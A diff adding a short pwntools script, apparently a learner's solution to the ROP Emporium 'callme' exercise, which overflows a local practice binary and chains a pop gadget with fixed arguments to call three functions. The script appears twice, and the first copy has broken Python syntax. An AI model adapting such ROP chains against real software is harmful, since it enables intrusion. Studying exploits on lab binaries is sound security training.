@@ -1,0 +1,23 @@
+This program involved using multiple function calls in rop chain
+
+from pwn import *
+elf=ELF("./callme")
+p=elf.process()
+                    pop 3                 arg1                     arg2                       arg3                     func addr (try to use sym always)
+payload = b'a'*0x28+p64(0x0040093c) + p64(0xdeadbeefdeadbeef) +p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(elf.sym.callme_one) + 
+                    p64(0x0040093c) + p64(0xdeadbeefdeadbeef) +p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(elf.sym.callme_two) + 
+                    p64(0x0040093c) + p64(0xdeadbeefdeadbeef) +p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(elf.sym.callme_three)
+print(hex(elf.sym.callme_one))
+p.recv()
+p.sendline(payload)
+p.interactive()
+
+
+from pwn import *
+elf=ELF("./callme")
+p=elf.process()
+payload = b'a'*0x28 + p64(0x0040093c) + p64(0xdeadbeefdeadbeef) +p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(elf.sym.callme_one) + p64(0x0040093c) + p64(0xdeadbeefdeadbeef) +p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(elf.sym.callme_two) + p64(0x0040093c) + p64(0xdeadbeefdeadbeef) +p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d) + p64(elf.sym.callme_three)
+print(hex(elf.sym.callme_one))
+p.recv()
+p.sendline(payload)
+p.interactive()
